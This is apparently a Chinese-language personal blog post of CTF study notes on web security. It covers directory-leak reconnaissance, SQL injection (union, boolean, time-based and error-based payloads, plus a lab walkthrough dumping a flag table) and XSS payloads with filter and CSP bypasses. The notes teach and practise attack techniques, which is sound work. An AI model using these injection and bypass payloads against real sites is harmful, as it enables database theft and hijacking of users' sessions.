<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web安全 | Only0901'blog</title><meta name="author" content="Only0901"><meta name="copyright" content="Only0901"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一，信息收集 HTTP头分析：通过Server字段确定后端服务器类型、开发语言及版本 指纹识别：使用Wappalyzer等工具通过特征文件识别  通过泄露的敏感目录，我们可以获取服务器路径、url甚至直接获取网站源码，敏感目录包括：  版本控制泄露： Git目录泄露（使用GitHacker工具还原） SVN目录泄露（类似Git泄露原理）   开发环境泄露： IDEA工程目录（含项目路径和数据库信">
<meta property="og:type" content="article">
<meta property="og:title" content="web安全">
<meta property="og:url" content="https://only-only1.github.io/2025/11/27/web%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="Only0901&#39;blog">
<meta property="og:description" content="一，信息收集 HTTP头分析：通过Server字段确定后端服务器类型、开发语言及版本 指纹识别：使用Wappalyzer等工具通过特征文件识别  通过泄露的敏感目录，我们可以获取服务器路径、url甚至直接获取网站源码，敏感目录包括：  版本控制泄露： Git目录泄露（使用GitHacker工具还原） SVN目录泄露（类似Git泄露原理）   开发环境泄露： IDEA工程目录（含项目路径和数据库信">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://only-only1.github.io/images/980.jpg">
<meta property="article:published_time" content="2025-11-27T08:57:36.000Z">
<meta property="article:modified_time" content="2025-11-27T08:59:00.008Z">
<meta property="article:author" content="Only0901">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://only-only1.github.io/images/980.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "web安全",
  "url": "https://only-only1.github.io/2025/11/27/web%E5%AE%89%E5%85%A8/",
  "image": "https://only-only1.github.io/images/980.jpg",
  "datePublished": "2025-11-27T08:57:36.000Z",
  "dateModified": "2025-11-27T08:59:00.008Z",
  "author": [
    {
      "@type": "Person",
      "name": "Only0901",
      "url": "https://only-only1.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://only-only1.github.io/2025/11/27/web%E5%AE%89%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'web安全',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fa-solid fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/980.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Only0901'blog</span></a><a class="nav-page-title" href="/"><span class="site-name">web安全</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fa-solid fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-27T08:57:36.000Z" title="发表于 2025-11-27 16:57:36">2025-11-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-27T08:59:00.008Z" title="更新于 2025-11-27 16:59:00">2025-11-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><hr>
<h2 id="一，信息收集"><a href="#一，信息收集" class="headerlink" title="一，信息收集"></a><font style="color:#DF2A3F;">一，信息收集</font></h2><ul>
<li>HTTP头分析：通过Server字段确定后端服务器类型、开发语言及版本</li>
<li>指纹识别：使用Wappalyzer等工具通过特征文件识别</li>
</ul>
<p>通过泄露的敏感目录，我们可以获取服务器路径、url甚至直接获取网站源码，敏感目录包括：</p>
<ul>
<li>版本控制泄露：<ul>
<li>Git目录泄露（使用GitHacker工具还原）</li>
<li>SVN目录泄露（类似Git泄露原理）</li>
</ul>
</li>
<li>开发环境泄露：<ul>
<li>IDEA工程目录（含项目路径和数据库信息）</li>
</ul>
</li>
<li>管理后台泄露：通过目录扫描发现后台地址</li>
</ul>
<p><font style="color:#5C8D07;">     工具： dirsearch   ffuf  </font></p>
<p><font style="color:#5C8D07;"></font></p>
<ul>
<li><font style="color:#5C8D07;">适用场景</font><font style="color:#5C8D07;">：题目信息不足时的通用手段</font></li>
<li><font style="color:#5C8D07;">限制情况</font><font style="color:#5C8D07;">：部分比赛禁止目录扫描（资源消耗大）</font></li>
<li><font style="color:#5C8D07;">典型发现：<a target="_blank" rel="noopener" href="http://www.zip源码包、管理后台路径/">www.zip源码包、管理后台路径</a></font></li>
</ul>
<p><font style="color:#5C8D07;"></font></p>
<p><font style="color:#5C8D07;"></font></p>
<p>常见常用敏感文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758975753833-8e2a4e34-e0d6-45ff-a017-1f45da41e89c.png"></p>
<p> <font style="color:#5C8D07;">GitHacker工具使用  </font></p>
<pre><code>- &lt;font style=&quot;color:#5C8D07;&quot;&gt;通过pip安装GitHacker&lt;/font&gt;
- &lt;font style=&quot;color:#5C8D07;&quot;&gt;操作流程&lt;/font&gt;&lt;font style=&quot;color:#5C8D07;&quot;&gt;：&lt;/font&gt;
    * &lt;font style=&quot;color:#5C8D07;&quot;&gt;下载.git目录内容&lt;/font&gt;
    * &lt;font style=&quot;color:#5C8D07;&quot;&gt;通过git log查看提交历史&lt;/font&gt;
    * &lt;font style=&quot;color:#5C8D07;&quot;&gt;使用checkout回退到含漏洞版本&lt;/font&gt;
- &lt;font style=&quot;color:#5C8D07;&quot;&gt;漏洞分析&lt;/font&gt;&lt;font style=&quot;color:#5C8D07;&quot;&gt;：发现index.php存在命令注入漏洞&lt;/font&gt;
- &lt;font style=&quot;color:#5C8D07;&quot;&gt;利用验证：通过参数执行系统命令（如ls/ ）  &lt;/font&gt;
</code></pre>
<p><font style="background-color:#E4495B;">用dirsearch扫目录，然后用GitHacker读取敏感文件</font></p>
<p><font style="background-color:#E4495B;">见d1</font></p>
<p><strong><font style="color:#DF2A3F;"></font></strong></p>
<h2 id="二，SQL注入"><a href="#二，SQL注入" class="headerlink" title="二，SQL注入"></a><font style="color:#DF2A3F;">二，SQL注入</font></h2><p>产生原因: 当开发者直接将用户输入拼接到SQL查询语句中且未做过滤时，攻击者可通过构造特殊输入改变原始SQL语义。  </p>
<p>本质特征: 用户输入被作为SQL代码执行而非单纯的数据处理，这是与正常查询的根本区别  </p>
<h6 id="1-数字型注入测试方法："><a href="#1-数字型注入测试方法：" class="headerlink" title="1.数字型注入测试方法："></a><font style="color:#5C8D07;">1.数字型注入测试方法：</font></h6><pre><code>- &lt;font style=&quot;color:#5C8D07;&quot;&gt;输入id=1返回admin&lt;/font&gt;
- &lt;font style=&quot;color:#5C8D07;&quot;&gt;输入id=2-1同样返回admin&lt;/font&gt;
- &lt;font style=&quot;color:#5C8D07;&quot;&gt;输入id=3-1返回null，验证注入存在&lt;/font&gt;
</code></pre>
<p>union功能作用: 合并两个SELECT结果集，要求列数相同。通过id&#x3D;0使前查询为空，后查询显示敏感数据。  前提要知道有password这个列和users这个表</p>
<ul>
<li><font style="color:#5C8D07;">实际应用:</font><ul>
<li><font style="color:#5C8D07;">构造</font><font style="color:#5C8D07;">id&#x3D;0 union select password from users</font></li>
<li><font style="color:#5C8D07;">空格需URL编码为%20</font></li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982038575-914ffa2b-99d7-44df-9b1f-c1e58f797522.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982193100-a4d82e3b-7d89-463a-8f8e-6a2c196e035b.png"></p>
<h5 id="2-字符型注入："><a href="#2-字符型注入：" class="headerlink" title="2.字符型注入："></a>2.字符型注入：</h5><p> 用户输入被单引号包裹where username&#x3D;’$_GET[‘username’]’，需考虑引号闭合  </p>
<ul>
<li><font style="color:#5C8D07;">注入方法:</font><ul>
<li><font style="color:#5C8D07;">使用</font><font style="color:#5C8D07;">‘or 1&#x3D;1#</font><font style="color:#5C8D07;">构造万能密码</font></li>
<li><font style="color:#5C8D07;">单引号闭合前引号，#号注释后引号</font></li>
<li><font style="color:#5C8D07;">特殊字符需URL编码(%27为单引号，%23为#号)</font></li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982348942-b3335960-ccb4-4898-adf0-73dcb0d3fe43.png"></p>
<h3 id="3-布尔盲注："><a href="#3-布尔盲注：" class="headerlink" title="3.布尔盲注："></a>3.布尔盲注：</h3><p> 服务器仅返回”用户存在&#x2F;不存在”二元状态时使用。  </p>
<ul>
<li>实现方法:<ul>
<li>使用substr函数逐字符判断：’or substr(password,1,1)&#x3D;’1’#</li>
<li>通过响应变化确定字符值（如返回”存在”时字符匹配成功）</li>
<li>需遍历所有可能字符（字母、数字、符号）</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982597603-a461b3cd-e1ac-48f4-887d-f72e3c389e0e.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982610032-b723cb1d-3cd2-4993-a1ee-0aeaf19890e2.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758982720409-1b6644f2-0300-42c4-bb71-92abf8eacb23.png"></p>
<h4 id="4-时间盲注："><a href="#4-时间盲注：" class="headerlink" title="4.时间盲注："></a>4.时间盲注：</h4><p>.适用场景: 服务器无任何输出，仅返回固定响应时使用</p>
<ul>
<li><font style="color:#5C8D07;">核心方法:</font><ul>
<li><font style="color:#5C8D07;">利用MySQL内置的sleep函数人为制造时间差异</font></li>
<li><font style="color:#5C8D07;">通过响应时间判断条件真假</font></li>
</ul>
</li>
<li><font style="color:#5C8D07;">测量工具</font><font style="color:#5C8D07;">: 使用Burp Suite测量SQL执行延时</font></li>
<li><font style="color:#5C8D07;">示例构造</font><font style="color:#5C8D07;">:</font><ul>
<li><font style="color:#5C8D07;">username&#x3D;’ or sleep(1)#</font><font style="color:#5C8D07;"> 产生1秒延迟</font></li>
<li><font style="color:#5C8D07;">username&#x3D;’ or if(substr(password,1,1)&#x3D;’3’,sleep(1),1)# 通过延时判断密码第一位是否为3</font></li>
</ul>
</li>
</ul>
<p><font style="color:#5C8D07;">  </font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758983078097-eb448a23-7443-48df-b8ad-6096a005ae90.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758983109154-e3d46d91-7217-4915-919d-ed2abf399a9e.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758983169316-c0e21343-aabb-43ef-bf4a-616c84b30eb7.png"></p>
<h5 id="5-报错注入："><a href="#5-报错注入：" class="headerlink" title="5.报错注入："></a>5.报错注入：</h5><ul>
<li>适用场景: 服务器返回SQL错误信息时使用</li>
<li>核心思想: 利用错误信息回显需要的数据</li>
<li>函数原型: ExtractValue(xml_frag,xpath_expr)</li>
<li>正常用法: 从XML中提取元素</li>
<li>报错利用:<ul>
<li>故意构造错误的xpath语法</li>
<li>错误信息会回显xpath参数内容</li>
<li>在xpath参数前加’~’使其语法错误</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758983441657-dae55f8e-95c9-403f-907b-87b7ec1cbc2a.png"></p>
<ul>
<li><font style="color:#5C8D07;">示例构造:</font><ul>
<li><font style="color:#5C8D07;">username&#x3D;’ or extractvalue(1,concat(‘~’,(select ‘123’)))#</font></li>
<li><font style="color:#5C8D07;">错误信息会显示”XPATH syntax error: ~123”</font></li>
</ul>
</li>
<li><font style="color:#5C8D07;">数据获取:</font><ul>
<li><font style="color:#5C8D07;">将查询结果与波浪号拼接</font></li>
<li><font style="color:#5C8D07;">通过错误回显获取查询数据</font></li>
</ul>
</li>
<li><font style="color:#5C8D07;">常见报错函数</font><font style="color:#5C8D07;">:</font><ul>
<li><font style="color:#5C8D07;">floor函数(主键冲突)</font></li>
<li><font style="color:#5C8D07;">updatexml函数(xpath语法错误)</font></li>
<li><font style="color:#5C8D07;">exp函数</font></li>
<li><font style="color:#5C8D07;">GeometryCollection函数</font></li>
<li><font style="color:#5C8D07;">polygon函数</font></li>
<li><font style="color:#5C8D07;">multipoint函数</font></li>
</ul>
</li>
</ul>
<h5 id="6-用户插入数据位置不同导致的SQL注入点-："><a href="#6-用户插入数据位置不同导致的SQL注入点-：" class="headerlink" title="6.用户插入数据位置不同导致的SQL注入点 ："></a>6.用户插入数据位置不同导致的SQL注入点 ：</h5><ul>
<li>常见位置: 主要在WHERE子句中进行条件查询时出现</li>
<li>注入特点:<ul>
<li>在WHERE和ORDER BY之间插入时可以使用UNION联合查询</li>
<li>在ORDER BY之后插入时无法使用UNION，只能使用盲注或报错注入</li>
</ul>
</li>
</ul>
<h3 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a><font style="color:#5C8D07;">实验步骤：</font></h3><p><font style="color:rgb(2,2,2);">步骤</font><font style="color:rgb(2,2,2);">1： 查看网页内容</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984161749-5f1d7217-eae3-4d4a-9160-ab0a4bb086ec.png"></p>
<p><font style="color:rgb(2,2,2);"></font></p>
<p><font style="color:rgb(2,2,2);">步骤2：判断是否存在sql注入</font></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(34,34,34);">‘or’1’&#x3D;’1可以成功查询出数据，因此存在sql注入。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984185493-e6b2afd1-3055-4929-af84-d131dd209729.png"></p>
<p><font style="color:rgb(2,2,2);"></font></p>
<p><font style="color:rgb(2,2,2);">步骤3：判断查询时选择的列数</font></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(199,37,78);background-color:rgb(249,242,244);">admin’ order by 2 #</font><font style="color:rgb(34,34,34);">可以查询出数据</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984216434-d15ece2e-f8f0-4468-acdd-dfd36b5a9b72.png"></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(199,37,78);background-color:rgb(249,242,244);">admin’ order by 3 #</font><font style="color:rgb(34,34,34);">无法查询出数据</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984228296-c8d69512-b2c3-4dac-8a0e-3111fdfb8a3f.png"></p>
<p><font style="color:rgb(34,34,34);">因此当前查询的列数为</font><font style="color:rgb(34,34,34);">2</font></p>
<p><font style="color:rgb(34,34,34);"></font></p>
<p><font style="color:rgb(2,2,2);">步骤</font><font style="color:rgb(2,2,2);">4：使用union查询其他表</font></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(199,37,78);background-color:rgb(249,242,244);">‘ union select group_concat(table_name),1 from information_schema.tables where table_schema&#x3D;database() #</font><font style="color:rgb(34,34,34);">查询同库的表，发现了users表和flag表</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984253993-b0de9a72-e361-4c6e-9a51-23a2dda22789.png"></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(199,37,78);background-color:rgb(249,242,244);">‘ union select group_concat(column_name),1 from information_schema.columns where table_name&#x3D;’flag’ #</font><font style="color:rgb(34,34,34);">查询</font><font style="color:rgb(34,34,34);">flag表中的列名，发现一列content</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984268623-4dbbc46c-4c70-4436-8fe1-439ac14fcd83.png"></p>
<p><font style="color:rgb(2,2,2);"></font></p>
<p><font style="color:rgb(2,2,2);">步骤5：查询flag表中的flag值</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758984289439-234942d1-58f3-44ac-8fa4-6ced4799742f.png"></p>
<p><font style="color:rgb(34,34,34);">使用</font><font style="color:rgb(199,37,78);background-color:rgb(249,242,244);">‘ union select group_concat(content),1 from flag #</font><font style="color:rgb(34,34,34);">，查询到flag</font></p>
<p><font style="color:rgb(34,34,34);"></font></p>
<p><font style="color:rgb(34,34,34);"></font></p>
<h2 id="三，xss"><a href="#三，xss" class="headerlink" title="三，xss"></a><font style="color:#DF2A3F;">三，xss</font></h2><ul>
<li>定义: XSS(Cross-Site Scripting)是一种网站应用程序的安全漏洞，属于代码注入的一种，允许将恶意代码注入网页，影响其他观看网页的用户。</li>
<li>攻击原理: 利用网站开发时留下的漏洞，注入恶意指令代码到网页中，使用户加载并执行恶意程序。</li>
<li>常见形式: 通常包含HTML和用户端脚本语言(如JavaScript)，但也可包含Java、VBScript、ActiveX、Flash等。</li>
<li>危害: 攻击成功后可能获取更高权限、窃取私密网页内容、会话和Cookie等敏感信息。</li>
</ul>
<p><font style="color:#5C8D07;">XSS的类型：</font></p>
<h6 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h6><ul>
<li>特点: 恶意代码未被服务器储存，每次触发时通过GET&#x2F;POST方式提交，用户输入内容被直接输出到HTML中。</li>
<li>示例: PHP代码echo “hello!$name”直接从URL获取name参数并输出，攻击者可注入<script>alert('xss')</script>等恶意代码。</li>
<li>攻击方式: 通过构造恶意URL诱导用户点击，代码仅在当前页面执行。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758987100942-522fe42a-b74c-44f5-876a-a3e19d34ed0e.png"></p>
<h6 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h6><ul>
<li>特点: 用户输入被保存在数据库或服务器存储中，造成持续性影响，比反射型更具威胁性。</li>
<li>示例: PHP代码将用户输入保存到文件data.txt中，每次访问页面都会读取并执行之前存储的恶意代码。</li>
<li>常见场景: 用户发布的帖子、个人信息页面等需要服务器存储用户输入的场景。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758987364302-ddb91d0d-4528-4069-a6f3-481db1d986b0.png"></p>
<h6 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h6><ul>
<li>特点: 漏洞发生在前端而非后端，前端JavaScript直接将用户输入写入HTML DOM中。</li>
<li>示例: 静态HTML文件通过JavaScript获取URL参数并直接使用document.write()输出到页面。</li>
<li>执行差异: 只有document.write()会执行script标签内代码，而innerHTML插入的内容不会执行script标签。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758987423393-1d094ed0-b8bc-41ec-b552-be4dca798526.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758987457727-4a1c036b-c462-4cf8-9d31-f3d86b6a91ea.png"></p>
<h5 id="可以用来执行XSS的标签"><a href="#可以用来执行XSS的标签" class="headerlink" title=". 可以用来执行XSS的标签"></a>. 可以用来执行XSS的标签</h5><ul>
<li>script标签: 最原始方式，直接在标签内写JavaScript代码。</li>
<li>事件属性: 几乎所有标签的on事件(如onmouseover、onerror)都可执行JavaScript代码。</li>
<li>特殊标签:<ul>
<li><img src=x onerror=alert(1)>利用加载错误触发</li>
<li><iframe src="javascript:alert(1)">使用JavaScript伪协议</li>
<li><svg onload=alert(1)>利用SVG加载事件</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758987594350-d825e707-df52-466c-929f-a2996a4b6112.png"></p>
<h5 id="HTML5特性的XSS"><a href="#HTML5特性的XSS" class="headerlink" title="HTML5特性的XSS"></a>HTML5特性的XSS</h5><ul>
<li>交互需求: 许多标签的on属性需要用户交互才能触发(如<input onfocus=alert(1)>需要获得焦点)。</li>
<li>自动触发: HTML5的autofocus属性可自动实现聚焦，将需要交互的XSS变为无需交互。</li>
</ul>
<h5 id="Javascript伪协议xss"><a href="#Javascript伪协议xss" class="headerlink" title="Javascript伪协议xss"></a>Javascript伪协议xss</h5><ul>
<li>定义: “javascript:”开头的伪协议，由JavaScript引擎执行而非浏览器加载资源。</li>
<li>应用场景:<ul>
<li><a href="javascript:alert(1)">click here</a>点击链接执行</li>
<li><iframe src="javascript:alert(1)">自动触发执行</li>
</ul>
</li>
<li>特点: 提供了一种不依赖特定事件触发XSS的方式。</li>
</ul>
<p><font style="color:#5C8D07;">XSS的过滤和绕过</font> </p>
<ul>
<li>过滤层级：主要分为WAF层和代码层两层过滤机制</li>
<li>WAF层：Web应用防火墙，部署在网络硬件层面，对HTTP请求进行过滤拦截</li>
<li>代码层：在Web应用开发中直接实现或引用第三方库进行输入过滤</li>
<li>绕过难点：由于JavaScript语法高度灵活，普通正则匹配和字符串比较难以有效拦截XSS攻击</li>
</ul>
<h5 id="富文本过滤"><a href="#富文本过滤" class="headerlink" title="富文本过滤"></a>富文本过滤</h5><ul>
<li><p>应用场景：邮件系统、博客平台等需要支持富文本编辑（超链接&#x2F;图片&#x2F;视频插入）的场景</p>
</li>
<li><p>漏洞成因：编辑器允许直接编辑HTML时，基于XSS原理产生安全风险</p>
</li>
<li><p>黑名单缺陷：若采用标签黑名单机制，可通过寻找遗漏标签实现绕过</p>
</li>
<li><p>双写绕过：当过滤器简单替换黑名单内容为空时，可通过重复关键词实现绕过（如<scriscriptpt>）</p>
</li>
<li><p>局限性：仅适用于简单替换型过滤器，现代防护多采用直接拒绝或完整删除策略</p>
</li>
</ul>
<h5 id="注入点在标签属性中"><a href="#注入点在标签属性中" class="headerlink" title="注入点在标签属性中"></a>注入点在标签属性中</h5><ul>
<li>尖括号未过滤：可直接插入新标签实现攻击</li>
<li>尖括号已过滤：可通过事件属性（如onload&#x2F;onerror&#x2F;onmousemove等）注入</li>
<li>编码绕过：标签属性支持HTML编码，可绕过关键词过滤（如&#x61;&#x6c;&#x65;&#x72;&#x74;对应alert）</li>
<li>实操演示：通过工具将alert(1)转换为HTML实体编码后成功执行</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758988488793-52a9f4d5-573f-4644-a3f3-41dcadc71238.png"></p>
<h5 id="注入点在script标签中"><a href="#注入点在script标签中" class="headerlink" title="注入点在script标签中"></a>注入点在script标签中</h5><ul>
<li>引号闭合：类似SQL注入，先闭合引号再用分号插入代码</li>
<li>双注入点：当存在两个相邻注入点时，可用反斜杠转义第一个引号，从第二个注入点插入代码</li>
<li>Unicode绕过：对黑名单关键词（如eval）使用Unicode编码（如\u0065\u0076\u0061\u006c）<img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1758988414719-4c79c2cf-606f-4fd0-b7b9-b710ec526ff4.png"></li>
</ul>
<p><font style="color:#5C8D07;">CSP </font></p>
<ul>
<li><p>定义：内容安全策略(Content Security Policy)是防御XSS和数据注入的额外安全层</p>
</li>
<li><p>兼容性：设计为完全向后兼容，不支持浏览器会忽略策略采用默认同源策略</p>
</li>
<li><p>配置方式：通过HTTP头部Content-Security-Policy字段或meta标签配置</p>
</li>
<li><p>策略演示：配置script-src ‘self’限制脚本仅加载同源资源</p>
</li>
<li><p>违规警告：内联脚本执行时会触发浏览器控制台警告</p>
</li>
<li><p>指令类型：</p>
<ul>
<li>获取指令（如connect-src限制请求源）</li>
<li>文档指令</li>
<li>导航指令</li>
</ul>
</li>
<li><p>关键指令：</p>
<ul>
<li>default-src：默认加载策略</li>
<li>script-src：限制JS源地址</li>
<li>img-src：限制图片源地址</li>
</ul>
</li>
</ul>
<h5 id="CSP过滤及其绕过"><a href="#CSP过滤及其绕过" class="headerlink" title="CSP过滤及其绕过"></a>CSP过滤及其绕过</h5><ul>
<li>文件上传：将恶意脚本上传至同域下绕过’self’限制</li>
<li>JSONP利用：<ul>
<li>传统用途：解决跨域数据请求问题</li>
<li>攻击原理：通过callback参数注入恶意代码（如callback&#x3D;alert(1);&#x2F;&#x2F;）</li>
<li>CSP场景：加载同域JSONP接口作为合法脚本源执行攻击代码</li>
</ul>
</li>
</ul>
